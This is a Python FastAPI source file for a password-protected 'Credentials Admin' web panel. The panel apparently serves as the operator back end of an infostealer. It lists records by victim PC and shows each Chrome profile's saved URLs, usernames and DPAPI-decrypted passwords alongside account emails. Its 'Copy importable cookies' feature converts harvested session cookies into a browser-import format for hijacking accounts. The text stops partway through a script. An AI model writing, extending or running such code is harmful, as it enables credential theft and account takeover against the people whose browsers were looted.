import html
import json
import re
import secrets
from collections import defaultdict
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Query, status
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel

from app.config import ADMIN_AUTH_PASSWORD, ADMIN_AUTH_USER, ENVIRONMENT
from app.repository import (
    get_payload_by_id,
    get_script_error_by_id,
    list_distinct_environments,
    list_distinct_pc_names,
    list_error_filter_options,
    list_payloads,
    list_pcs,
    list_script_errors,
    update_pc_tag,
)

security = HTTPBasic()


def verify_admin_basic_auth(credentials: HTTPBasicCredentials = Depends(security)) -> None:
    user_ok = secrets.compare_digest(credentials.username, ADMIN_AUTH_USER)
    password_ok = secrets.compare_digest(credentials.password, ADMIN_AUTH_PASSWORD)
    if not (user_ok and password_ok):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Unauthorized",
            headers={"WWW-Authenticate": 'Basic realm="admin"'},
        )


router = APIRouter(dependencies=[Depends(verify_admin_basic_auth)])

ERROR_CODES_PATH = Path(__file__).with_name("error_codes.json")
ERROR_CODES: dict[str, str] = json.loads(ERROR_CODES_PATH.read_text(encoding="utf-8"))


def resolve_error_message(code: Any) -> str:
    if code is None:
        return ERROR_CODES.get("9000", "unknown error")
    return ERROR_CODES.get(str(code), ERROR_CODES.get("9000", "unknown error"))


class PcTagBody(BaseModel):
    tag: str | None = None


def sort_profile_names(names: list[str]) -> list[str]:
    def sort_key(name: str) -> tuple[int, int | str]:
        if name == "Default":
            return (0, 0)
        match = re.match(r"Profile (\d+)$", name)
        if match:
            return (1, int(match.group(1)))
        return (2, name)

    return sorted(names, key=sort_key)


def group_passwords_by_profile(content: dict[str, Any]) -> dict[str, list[dict[str, Any]]]:
    grouped: dict[str, list[dict[str, Any]]] = defaultdict(list)
    for entry in content.get("passwords") or []:
        if not isinstance(entry, dict):
            continue
        profile = str(entry.get("profile") or "Unknown")
        grouped[profile].append(entry)
    for profile in grouped:
        grouped[profile].sort(key=lambda item: (item.get("url") or "", item.get("username") or ""))
    return dict(grouped)


def get_profile_metadata(content: dict[str, Any], folder: str) -> dict[str, Any]:
    profiles = content.get("profiles")
    if not isinstance(profiles, dict):
        return {}
    meta = profiles.get(folder)
    return meta if isinstance(meta, dict) else {}


def resolve_password_value(entry: dict[str, Any]) -> str:
    password_dpapi = str(entry.get("password_dpapi") or "").strip()
    if password_dpapi:
        return password_dpapi
    password = str(entry.get("password") or "").strip()
    if password and "App-Bound Encryption" not in password:
        return password
    return ""


def group_cookies_by_profile(content: dict[str, Any]) -> dict[str, list[dict[str, Any]]]:
    grouped: dict[str, list[dict[str, Any]]] = defaultdict(list)
    for entry in content.get("cookies") or []:
        if not isinstance(entry, dict):
            continue
        profile = str(entry.get("profile") or "Unknown")
        grouped[profile].append(entry)
    for profile in grouped:
        grouped[profile].sort(
            key=lambda item: (item.get("host") or "", item.get("name") or "", item.get("path") or "")
        )
    return dict(grouped)


def profile_tab_label(
    folder: str,
    meta: dict[str, Any],
    password_count: int,
    cookie_count: int = 0,
) -> str:
    label = (
        str(meta.get("name") or "").strip()
        or str(meta.get("gaia_name") or "").strip()
        or folder
    )
    parts = []
    if password_count:
        parts.append(f"{password_count} pwd")
    if cookie_count:
        parts.append(f"{cookie_count} cookies")
    if parts:
        return f"{label} ({', '.join(parts)})"
    return label


def collect_profile_names(content: dict[str, Any]) -> list[str]:
    password_profiles = set(group_passwords_by_profile(content).keys())
    cookie_profiles = set(group_cookies_by_profile(content).keys())
    return sort_profile_names(list(password_profiles | cookie_profiles))


def render_copy_button(value: str) -> str:
    if not value:
        return ""
    return (
        f'<button type="button" class="copy-btn" data-copy="{html.escape(value, quote=True)}" '
        f'title="Copy" aria-label="Copy">Copy</button>'
    )


def render_copy_cell(value: str, *, mono: bool = False) -> str:
    if not value:
        return '<span class="password-empty">—</span>'
    text_class = "cell-text mono" if mono else "cell-text password-value"
    return (
        f'<div class="copy-cell">'
        f'<span class="{text_class}">{html.escape(value)}</span>'
        f"{render_copy_button(value)}"
        f"</div>"
    )


def render_password_rows(passwords: list[dict[str, Any]]) -> str:
    if not passwords:
        return '<tr class="password-empty-row"><td colspan="3" class="empty">No passwords for this profile.</td></tr>'

    rows = []
    for entry in passwords:
        url = str(entry.get("url") or "")
        username = str(entry.get("username") or "")
        password = resolve_password_value(entry)
        rows.append(
            "<tr class=\"password-row\" "
            f'data-url="{html.escape(url.lower(), quote=True)}" '
            f'data-username="{html.escape(username.lower(), quote=True)}">'
            f'<td class="mono">{html.escape(url) if url else "—"}</td>'
            f"<td>{render_copy_cell(username)}</td>"
            f"<td>{render_copy_cell(password)}</td>"
            "</tr>"
        )
    return "".join(rows)


def render_record_profiles(content: dict[str, Any]) -> str:
    passwords_by_profile = group_passwords_by_profile(content)
    cookies_by_profile = group_cookies_by_profile(content)
    profile_names = collect_profile_names(content)

    if not profile_names:
        return '<div class="empty">No passwords or cookies in this record.</div>'

    tabs = []
    panels = []

    for index, folder in enumerate(profile_names):
        passwords = passwords_by_profile.get(folder, [])
        cookie_count = len(cookies_by_profile.get(folder, []))
        meta = get_profile_metadata(content, folder)
        active = " active" if index == 0 else ""
        tab_id = html.escape(folder, quote=True)
        label = html.escape(profile_tab_label(folder, meta, len(passwords), cookie_count))
        cookie_actions = ""
        if cookie_count:
            cookie_actions = f"""<div class="profile-toolbar">
        <span class="profile-count">{cookie_count} cookies</span>
        <button type="button" class="view-cookies-btn" data-profile="{tab_id}">View cookies JSON</button>
        <button type="button" class="copy-cookies-btn primary" data-profile="{tab_id}">Copy importable cookies</button>
      </div>"""
        tabs.append(
            f'<button type="button" class="profile-tab{active}" data-profile="{tab_id}">{label}</button>'
        )
        panels.append(
            f"""<section class="profile-panel{active}" data-profile="{tab_id}">
      {render_profile_meta(folder, meta)}
      {cookie_actions}
      <div class="table-wrap">
        <table class="passwords-table">
          <colgroup>
            <col class="col-url">
            <col class="col-username">
            <col class="col-password">
          </colgroup>
          <thead>
            <tr>
              <th>URL</th>
              <th>Username</th>
              <th>Password</th>
            </tr>
          </thead>
          <tbody>
            {render_password_rows(passwords)}
          </tbody>
        </table>
      </div>
    </section>"""
        )

    return f"""<div class="profile-tabs">{"".join(tabs)}</div>
    <div class="profile-panels">{"".join(panels)}</div>"""


def render_profile_meta(folder: str, meta: dict[str, Any]) -> str:
    email = str(meta.get("email") or meta.get("user_name") or "").strip()
    display_name = str(meta.get("gaia_name") or meta.get("name") or "").strip()
    profile_name = str(meta.get("name") or "").strip()
    hosted_domain = str(meta.get("hosted_domain") or "").strip()

    items = [
        ("Chrome folder", folder),
    ]
    if profile_name:
        items.append(("Profile name", profile_name))
    if display_name and display_name != profile_name:
        items.append(("Display name", display_name))
    if email:
        items.append(("Email", email))
    if hosted_domain:
        items.append(("Hosted domain", hosted_domain))

    if len(items) == 1:
        items.append(("Metadata", "Not available for this record"))

    parts = []
    for label, value in items:
        parts.append(
            f"""<div class="profile-meta-item">
        <span class="profile-meta-label">{html.escape(label)}</span>
        <span class="profile-meta-value">{html.escape(value)}</span>
      </div>"""
        )
    return f'<div class="profile-meta-card">{"".join(parts)}</div>'


def render_layout(*, title: str, active_tab: str, content: str, scripts: str = "") -> str:
    records_active = "active" if active_tab == "records" else ""
    pcs_active = "active" if active_tab == "pcs" else ""
    errors_active = "active" if active_tab == "errors" else ""

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{html.escape(title)} · Admin</title>
  <style>
    * {{ box-sizing: border-box; }}
    body {{
      font-family: system-ui, sans-serif;
      margin: 0;
      background: #0f1115;
      color: #e6e8eb;
      min-height: 100vh;
    }}
    header {{
      padding: 1rem 1.25rem;
      border-bottom: 1px solid #2a2f3a;
      background: #151820;
    }}
    header h1 {{ margin: 0; font-size: 1.1rem; font-weight: 600; }}
    header h1 a {{
      color: inherit;
      text-decoration: none;
    }}
    .tabs {{
      display: flex;
      gap: 0.5rem;
      padding: 0.75rem 1.25rem 0;
      border-bottom: 1px solid #2a2f3a;
      background: #151820;
    }}
    .tab {{
      display: inline-block;
      padding: 0.55rem 0.9rem;
      border: 1px solid transparent;
      border-bottom: none;
      border-radius: 6px 6px 0 0;
      background: transparent;
      color: #9aa3b2;
      text-decoration: none;
      font: inherit;
    }}
    .tab:hover {{ color: #e6e8eb; }}
    .tab.active {{
      background: #0f1115;
      border-color: #2a2f3a;
      color: #e6e8eb;
    }}
    .container {{ padding: 1rem 1.25rem 2rem; max-width: 1200px; margin: 0 auto; }}
    .toolbar {{
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
      align-items: end;
      margin-bottom: 1rem;
    }}
    .toolbar-spaced {{
      justify-content: space-between;
      align-items: center;
    }}
    label {{
      display: grid;
      gap: 0.35rem;
      font-size: 0.8rem;
      color: #9aa3b2;
      min-width: 160px;
    }}
    select {{
      padding: 0.55rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #0f1115;
      color: #e6e8eb;
      font: inherit;
    }}
    button, .button-link {{
      padding: 0.55rem 0.85rem;
      border: 1px solid #3d4660;
      border-radius: 6px;
      background: #1c2230;
      color: #e6e8eb;
      font: inherit;
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
    }}
    button:hover, .button-link:hover {{ background: #252d3f; }}
    button.primary, .button-link.primary {{ background: #2563eb; border-color: #2563eb; }}
    button.primary:hover, .button-link.primary:hover {{ background: #1d4ed8; }}
    button:disabled {{ opacity: 0.45; cursor: not-allowed; }}
    .table-wrap {{
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      overflow: hidden;
      background: #151820;
    }}
    table {{ width: 100%; border-collapse: collapse; }}
    th, td {{
      padding: 0.75rem 1rem;
      text-align: left;
      border-bottom: 1px solid #2a2f3a;
      font-size: 0.88rem;
    }}
    th {{
      background: #1a2030;
      color: #9aa3b2;
      font-size: 0.78rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.03em;
    }}
    tr:last-child td {{ border-bottom: none; }}
    tbody tr.clickable {{ cursor: pointer; }}
    tbody tr.clickable:hover {{ background: #1a2030; }}
    .mono {{ font-family: ui-monospace, monospace; font-size: 0.82rem; }}
    .empty {{
      padding: 2rem;
      text-align: center;
      color: #9aa3b2;
    }}
    .pagination {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      margin-top: 1rem;
      flex-wrap: wrap;
    }}
    .pagination-info {{ font-size: 0.85rem; color: #9aa3b2; }}
    .pagination-controls {{ display: flex; gap: 0.5rem; align-items: center; }}
    .page-indicator {{ font-size: 0.85rem; min-width: 100px; text-align: center; }}
    .detail-header {{
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      margin-bottom: 1rem;
    }}
    .detail-title {{
      margin: 0;
      font-size: 1rem;
      font-weight: 600;
    }}
    .detail-meta {{
      font-size: 0.85rem;
      color: #9aa3b2;
      margin: 0.25rem 0 0;
    }}
    .detail-actions {{ display: flex; gap: 0.5rem; flex-wrap: wrap; }}
    pre {{
      margin: 0;
      padding: 1rem;
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      background: #0b0d11;
      overflow: auto;
      max-height: calc(100vh - 220px);
      font-size: 0.78rem;
      line-height: 1.45;
      white-space: pre-wrap;
      word-break: break-word;
    }}
    .status {{ font-size: 0.8rem; color: #22c55e; margin-top: 0.5rem; min-height: 1rem; }}
    .tag-pill {{
      display: inline-block;
      padding: 0.15rem 0.45rem;
      border-radius: 999px;
      background: #1e3a5f;
      color: #93c5fd;
      font-size: 0.75rem;
    }}
    .tag-muted {{ color: #6b7280; font-size: 0.78rem; }}
    .tag-input {{
      width: 100%;
      min-width: 180px;
      padding: 0.5rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #0f1115;
      color: #e6e8eb;
      font: inherit;
    }}
    .row-actions {{ display: flex; gap: 0.5rem; align-items: center; }}
    .save-status {{ font-size: 0.78rem; color: #22c55e; min-width: 4rem; }}
    .profile-tabs {{
      display: flex;
      flex-wrap: wrap;
      gap: 0.4rem;
      margin-bottom: 1rem;
    }}
    .profile-tab {{
      padding: 0.45rem 0.75rem;
      border: 1px solid #2a2f3a;
      border-radius: 999px;
      background: #151820;
      color: #9aa3b2;
      font: inherit;
      font-size: 0.82rem;
      cursor: pointer;
    }}
    .profile-tab:hover {{ color: #e6e8eb; border-color: #3d4660; }}
    .profile-tab.active {{
      background: #2563eb;
      border-color: #2563eb;
      color: #fff;
    }}
    .profile-panel {{ display: none; }}
    .profile-panel.active {{ display: block; }}
    .profile-meta-card {{
      display: flex;
      flex-wrap: wrap;
      gap: 1rem 2rem;
      padding: 0.85rem 1rem;
      margin-bottom: 1rem;
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      background: #151820;
      font-size: 0.85rem;
    }}
    .profile-meta-item {{
      display: grid;
      gap: 0.2rem;
    }}
    .profile-meta-label {{
      color: #9aa3b2;
      font-size: 0.72rem;
      text-transform: uppercase;
      letter-spacing: 0.03em;
    }}
    .profile-meta-value {{ color: #e6e8eb; }}
    .password-empty {{ color: #6b7280; }}
    .password-value {{ font-family: ui-monospace, monospace; font-size: 0.82rem; }}
    .profile-count {{ opacity: 0.75; font-size: 0.78rem; }}
    .profile-toolbar {{
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      align-items: center;
      margin-bottom: 1rem;
    }}
    .detail-toolbar {{
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem 1.25rem;
      align-items: end;
      margin-bottom: 1rem;
    }}
    .detail-toolbar label {{
      display: grid;
      gap: 0.35rem;
      font-size: 0.78rem;
      color: #9aa3b2;
    }}
    .detail-toolbar input[type="search"] {{
      min-width: 16rem;
      padding: 0.45rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #151820;
      color: #e6e8eb;
      font: inherit;
    }}
    .password-search-status {{
      font-size: 0.82rem;
      color: #9aa3b2;
      padding-bottom: 0.45rem;
    }}
    .passwords-table {{
      table-layout: fixed;
    }}
    .passwords-table .col-url {{ width: 30%; }}
    .passwords-table .col-username {{ width: 40%; }}
    .passwords-table .col-password {{ width: 30%; }}
    .copy-cell {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.5rem;
    }}
    .cell-text {{
      flex: 1;
      min-width: 0;
      word-break: break-word;
    }}
    .copy-btn {{
      padding: 0.2rem 0.45rem;
      border: 1px solid #3d4660;
      border-radius: 4px;
      background: #1c2230;
      color: #9aa3b2;
      font: inherit;
      font-size: 0.72rem;
      cursor: pointer;
      flex-shrink: 0;
    }}
    .copy-btn:hover {{ color: #e6e8eb; background: #252d3f; }}
    .copy-btn.copied {{ color: #22c55e; border-color: #22c55e; }}
    .modal-backdrop {{
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      z-index: 100;
    }}
    .modal-backdrop[hidden] {{ display: none; }}
    .modal {{
      width: min(900px, 100%);
      max-height: 90vh;
      background: #151820;
      border: 1px solid #2a2f3a;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }}
    .modal-header {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      padding: 1rem 1.25rem;
      border-bottom: 1px solid #2a2f3a;
    }}
    .modal-title {{ font-weight: 600; font-size: 0.95rem; }}
    .modal-actions {{ display: flex; gap: 0.5rem; flex-wrap: wrap; }}
    .modal-body {{
      padding: 1rem 1.25rem 1.25rem;
      overflow: auto;
    }}
  </style>
</head>
<body>
  <header><h1><a href="/admin-credentials/records">Credentials Admin</a></h1></header>
  <nav class="tabs">
    <a class="tab {records_active}" href="/admin-credentials/records">Records</a>
    <a class="tab {pcs_active}" href="/admin-credentials/pcs">PCs</a>
    <a class="tab {errors_active}" href="/admin-credentials/errors">Errors</a>
  </nav>
  {content}
  {scripts}
</body>
</html>"""


@router.get("/admin-credentials")
async def admin_root() -> RedirectResponse:
    return RedirectResponse(url="/admin-credentials/records", status_code=302)


@router.get("/admin-credentials/records", response_class=HTMLResponse)
async def admin_records_page() -> HTMLResponse:
    content = """
  <div class="container">
    <div class="toolbar">
      <label>
        Environment
        <select id="env-filter"></select>
      </label>
      <label>
        PC
        <select id="pc-filter">
          <option value="">All</option>
        </select>
      </label>
      <button type="button" id="refresh-btn">Refresh</button>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>PC</th>
            <th>Tag</th>
            <th>Environment</th>
            <th>Datetime</th>
            <th>Passwords</th>
            <th>Cookies</th>
          </tr>
        </thead>
        <tbody id="table-body"></tbody>
      </table>
      <div id="table-empty" class="empty" hidden>No records found.</div>
    </div>

    <div class="pagination">
      <div class="pagination-info" id="pagination-info"></div>
      <div class="pagination-controls">
        <button type="button" id="prev-btn">Previous</button>
        <span class="page-indicator" id="page-indicator"></span>
        <button type="button" id="next-btn">Next</button>
      </div>
    </div>
  </div>"""

    scripts = """
  <script>
    const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
    const envFilter = document.getElementById("env-filter");
    const pcFilter = document.getElementById("pc-filter");
    const tableBody = document.getElementById("table-body");
    const tableEmpty = document.getElementById("table-empty");
    const paginationInfo = document.getElementById("pagination-info");
    const pageIndicator = document.getElementById("page-indicator");
    const prevBtn = document.getElementById("prev-btn");
    const nextBtn = document.getElementById("next-btn");
    const refreshBtn = document.getElementById("refresh-btn");

    const PAGE_SIZE = 20;
    let currentPage = 1;
    let totalPages = 0;

    function escapeHtml(value) {
      return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;");
    }

    async function loadFilters() {
      const prevEnv = envFilter.value;
      const filterParams = prevEnv ? `?environment=${encodeURIComponent(prevEnv)}` : "";
      const res = await adminFetch(`/admin-credentials/filters${filterParams}`);
      const data = await res.json();

      envFilter.innerHTML = '<option value="">All</option>';
      for (const e of data.environments) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        envFilter.appendChild(opt);
      }
      envFilter.value = [...envFilter.options].some(o => o.value === prevEnv) ? prevEnv : "";

      const prevPc = pcFilter.value;
      pcFilter.innerHTML = '<option value="">All</option>';
      for (const pc of data.pc_names) {
        const opt = document.createElement("option");
        opt.value = pc;
        opt.textContent = pc;
        pcFilter.appendChild(opt);
      }
      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
    }

    async function loadList(page = currentPage) {
      currentPage = page;
      const params = new URLSearchParams();
      if (envFilter.value) params.set("environment", envFilter.value);
      params.set("page", String(currentPage));
      params.set("page_size", String(PAGE_SIZE));
      if (pcFilter.value) params.set("pc_name", pcFilter.value);

      const res = await adminFetch(`/admin-credentials/payloads?${params}`);
      const data = await res.json();

      totalPages = data.total_pages;
      tableBody.innerHTML = "";
      tableEmpty.hidden = data.total > 0;

      for (const item of data.items) {
        const tr = document.createElement("tr");
        tr.className = "clickable";
        const tagHtml = item.tag
          ? `<span class="tag-pill">${escapeHtml(item.tag)}</span>`
          : `<span class="tag-muted">—</span>`;
        tr.innerHTML = `
          <td class="mono">#${item.id}</td>
          <td>${escapeHtml(item.pc_name)}</td>
          <td>${tagHtml}</td>
          <td>${escapeHtml(item.environment)}</td>
          <td class="mono">${escapeHtml(item.datetime)}</td>
          <td>${item.password_count ?? 0}</td>
          <td>${item.cookie_count ?? 0}</td>`;
        tr.addEventListener("click", () => {
          window.location.href = `/admin-credentials/records/${item.id}`;
        });
        tableBody.appendChild(tr);
      }

      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
      const end = Math.min(data.page * data.page_size, data.total);
      paginationInfo.textContent = data.total
        ? `Showing ${start}–${end} of ${data.total}`
        : "No results";
      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
      prevBtn.disabled = data.page <= 1;
      nextBtn.disabled = data.page >= data.total_pages;
    }

    envFilter.addEventListener("change", async () => {
      await loadFilters();
      await loadList(1);
    });
    pcFilter.addEventListener("change", () => loadList(1));
    refreshBtn.addEventListener("click", async () => {
      await loadFilters();
      await loadList(1);
    });
    prevBtn.addEventListener("click", () => {
      if (currentPage > 1) loadList(currentPage - 1);
    });
    nextBtn.addEventListener("click", () => {
      if (currentPage < totalPages) loadList(currentPage + 1);
    });

    (async () => {
      await loadFilters();
      await loadList(1);
    })();
  </script>"""

    return HTMLResponse(render_layout(title="Records", active_tab="records", content=content, scripts=scripts))


@router.get("/admin-credentials/records/{payload_id}", response_class=HTMLResponse)
async def admin_record_detail(payload_id: int) -> HTMLResponse:
    payload = get_payload_by_id(payload_id)
    if payload is None:
        content = """
  <div class="container">
    <div class="detail-header">
      <div>
        <h2 class="detail-title">Record not found</h2>
        <p class="detail-meta">No record with this ID exists.</p>
      </div>
      <div class="detail-actions">
        <a class="button-link" href="/admin-credentials/records">Back to records</a>
      </div>
    </div>
  </div>"""
        return HTMLResponse(
            render_layout(title="Not found", active_tab="records", content=content),
            status_code=404,
        )

    pc_name = html.escape(payload["pc_name"])
    environment = html.escape(payload["environment"])
    recorded_at = html.escape(payload["datetime"])
    profiles_html = render_record_profiles(payload["content"])

    content = f"""
  <div class="container" data-payload-id="{payload_id}">
    <div class="detail-header">
      <div>
        <h2 class="detail-title">Record #{payload_id} · {pc_name}</h2>
        <p class="detail-meta">{environment} · {recorded_at}</p>
      </div>
      <div class="detail-actions">
        <a class="button-link" href="/admin-credentials/records">Back to records</a>
      </div>
    </div>
    <div class="detail-toolbar">
      <label>
        Search passwords
        <input type="search" id="password-search" placeholder="URL or username" autocomplete="off">
      </label>
      <span id="password-search-status" class="password-search-status"></span>
    </div>
    {profiles_html}
  </div>

  <div id="cookie-modal-backdrop" class="modal-backdrop" hidden>
    <div class="modal" role="dialog" aria-modal="true">
      <div class="modal-header">
        <div class="modal-title" id="cookie-modal-title">Cookies</div>
        <div class="modal-actions">
          <button type="button" id="cookie-modal-copy-json" class="primary">Copy JSON</button>
          <button type="button" id="cookie-modal-copy-import">Copy importable</button>
          <button type="button" id="cookie-modal-close">Close</button>
        </div>
      </div>
      <div class="modal-body">
        <pre id="cookie-modal-view"></pre>
        <div class="status" id="cookie-modal-status"></div>
      </div>
    </div>
  </div>"""

    scripts = f"""
  <script>
    const payloadId = {payload_id};
    const adminFetch = (url, options = {{}}) => fetch(url, {{ credentials: "same-origin", ...options }});
    const profileTabs = document.querySelectorAll(".profile-tab");
    const profilePanels = document.querySelectorAll(".profile-panel");
    const cookieModalBackdrop = document.getElementById("cookie-modal-backdrop");
    const cookieModalTitle = document.getElementById("cookie-modal-title");
    const cookieModalView = document.getElementById("cookie-modal-view");
    const cookieModalStatus = document.getElementById("cookie-modal-status");
    const cookieModalCopyJson = document.getElementById("cookie-modal-copy-json");
    const cookieModalCopyImport = document.getElementById("cookie-modal-copy-import");
    const cookieModalClose = document.getElementById("cookie-modal-close");
    const passwordSearch = document.getElementById("password-search");
    const passwordSearchStatus = document.getElementById("password-search-status");

    let modalCookies = [];
    let modalImportJson = "";

    function applyPasswordSearch() {{
      const query = (passwordSearch?.value || "").trim().toLowerCase();
      let totalRows = 0;
      let visibleRows = 0;

      document.querySelectorAll(".password-row").forEach((row) => {{
        totalRows += 1;
        const haystack = `${{row.dataset.url || ""}} ${{row.dataset.username || ""}}`;
        const matches = !query || haystack.includes(query);
        row.hidden = !matches;
        if (matches) visibleRows += 1;
      }});

      document.querySelectorAll(".password-empty-row").forEach((row) => {{
        row.hidden = !!query;
      }});

      document.querySelectorAll(".profile-panel").forEach((panel) => {{
        const panelRows = panel.querySelectorAll(".password-row");
        const panelVisible = [...panelRows].filter((row) => !row.hidden).length;
        const tab = document.querySelector(`.profile-tab[data-profile="${{panel.dataset.profile}}"]`);
        if (tab) {{
          tab.hidden = !!query && panelRows.length > 0 && panelVisible === 0;
        }}
        if (panel.classList.contains("active") && tab?.hidden) {{
          const nextTab = [...document.querySelectorAll(".profile-tab")].find((item) => !item.hidden);
          if (nextTab) nextTab.click();
        }}
      }});

      if (!passwordSearchStatus) return;
      if (!query) {{
        passwordSearchStatus.textContent = totalRows ? `${{totalRows}} passwords` : "";
        return;
      }}
      passwordSearchStatus.textContent = totalRows
        ? `${{visibleRows}} of ${{totalRows}} passwords`
        : "No passwords";
    }}

    passwordSearch?.addEventListener("input", applyPasswordSearch);
    applyPasswordSearch();

    profileTabs.forEach((tab) => {{
      tab.addEventListener("click", () => {{
        const profile = tab.dataset.profile;
        profileTabs.forEach((item) => item.classList.toggle("active", item === tab));
        profilePanels.forEach((panel) => {{
          panel.classList.toggle("active", panel.dataset.profile === profile);
        }});
      }});
    }});

    async function copyText(text, statusEl, button) {{
      if (statusEl) statusEl.textContent = "";
      try {{
        await navigator.clipboard.writeText(text);
        if (statusEl) statusEl.textContent = "Copied";
        if (button) {{
          const original = button.dataset.originalText || button.textContent;
          button.dataset.originalText = original;
          button.classList.add("copied");
          button.textContent = "Copied";
          setTimeout(() => {{
            button.classList.remove("copied");
            button.textContent = original;
          }}, 1200);
        }}
      }} catch (e) {{
        const textarea = document.createElement("textarea");
        textarea.value = text;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        const ok = document.execCommand("copy");
        textarea.remove();
        if (statusEl) statusEl.textContent = ok ? "Copied" : "Could not copy";
      }}
    }}

    document.querySelectorAll(".copy-btn").forEach((button) => {{
      button.addEventListener("click", (event) => {{
        event.stopPropagation();
        copyText(button.dataset.copy || "", null, button);
      }});
    }});

    function chromeTimeToUnix(expires) {{
      if (!expires || expires <= 0) return 0;
      const unix = Math.floor(Number(expires) / 1000000 - 11644473600);
      return unix > 0 ? unix : 0;
    }}

    function resolveCookieValue(cookie) {{
      return cookie.value_dpapi || cookie.value || "";
    }}

    function cookiesToImportJson(cookies) {{
      return cookies.map((cookie) => {{
        const host = cookie.host || "";
        const unix = chromeTimeToUnix(cookie.expires);
        const session = !cookie.expires || Number(cookie.expires) <= 0;
        return {{
          domain: host,
          expirationDate: session ? undefined : unix,
          hostOnly: !host.startsWith("."),
          httpOnly: !!cookie.httpOnly,
          name: cookie.name || "",
          path: cookie.path || "/",
          sameSite: "unspecified",
          secure: !!cookie.secure,
          session,
          storeId: "0",
          value: resolveCookieValue(cookie),
        }};
      }});
    }}

    async function fetchProfileCookies(profile) {{
      const params = new URLSearchParams({{ profile }});
      const res = await adminFetch(`/admin-credentials/payloads/${{payloadId}}/cookies?${{params}}`);
      if (!res.ok) throw new Error("Could not load cookies");
      const data = await res.json();
      return data.cookies || [];
    }}

    function openCookieModal(profile, cookies) {{
      modalCookies = cookies;
      modalImportJson = JSON.stringify(cookiesToImportJson(cookies), null, 2);
      cookieModalTitle.textContent = `${{profile}} · ${{cookies.length}} cookies`;
      cookieModalView.textContent = JSON.stringify(cookies, null, 2);
      cookieModalStatus.textContent = "";
      cookieModalBackdrop.hidden = false;
      document.body.style.overflow = "hidden";
    }}

    function closeCookieModal() {{
      cookieModalBackdrop.hidden = true;
      document.body.style.overflow = "";
      cookieModalStatus.textContent = "";
    }}

    document.querySelectorAll(".view-cookies-btn").forEach((button) => {{
      button.addEventListener("click", async () => {{
        button.disabled = true;
        try {{
          const cookies = await fetchProfileCookies(button.dataset.profile);
          openCookieModal(button.dataset.profile, cookies);
        }} catch (e) {{
          alert("Could not load cookies for this profile.");
        }} finally {{
          button.disabled = false;
        }}
      }});
    }});

    document.querySelectorAll(".copy-cookies-btn").forEach((button) => {{
      button.addEventListener("click", async () => {{
        button.disabled = true;
        try {{
          const cookies = await fetchProfileCookies(button.dataset.profile);
          const importJson = JSON.stringify(cookiesToImportJson(cookies), null, 2);
          await copyText(importJson, null, button);
        }} catch (e) {{
          alert("Could not copy cookies for this profile.");
        }} finally {{
          button.disabled = false;
        }}
      }});
    }});

    cookieModalCopyJson.addEventListener("click", () => {{
      copyText(JSON.stringify(modalCookies, null, 2), cookieModalStatus, null);
    }});

    cookieModalCopyImport.addEventListener("click", () => {{
      copyText(modalImportJson, cookieModalStatus, null);
    }});

    cookieModalClose.addEventListener("click", closeCookieModal);
    cookieModalBackdrop.addEventListener("click", (event) => {{
      if (event.target === cookieModalBackdrop) closeCookieModal();
    }});
    document.addEventListener("keydown", (event) => {{
      if (event.key === "Escape" && !cookieModalBackdrop.hidden) closeCookieModal();
    }});
  </script>"""

    return HTMLResponse(
        render_layout(
            title=f"Record #{payload_id}",
            active_tab="records",
            content=content,
            scripts=scripts,
        )
    )


@router.get("/admin-credentials/pcs", response_class=HTMLResponse)
async def admin_pcs_page() -> HTMLResponse:
    content = """
  <div class="container">
    <div class="toolbar">
      <label>
        Environment
        <select id="pcs-env-filter"></select>
      </label>
      <button type="button" id="pcs-refresh-btn">Refresh</button>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>PC</th>
            <th>Environment</th>
            <th>Identification tag</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="pcs-table-body"></tbody>
      </table>
      <div id="pcs-table-empty" class="empty" hidden>No PCs found.</div>
    </div>

    <div class="pagination">
      <div class="pagination-info" id="pcs-pagination-info"></div>
      <div class="pagination-controls">
        <button type="button" id="pcs-prev-btn">Previous</button>
        <span class="page-indicator" id="pcs-page-indicator"></span>
        <button type="button" id="pcs-next-btn">Next</button>
      </div>
    </div>
  </div>"""

    scripts = """
  <script>
    const DEFAULT_ENVIRONMENT = __DEFAULT_ENVIRONMENT__;
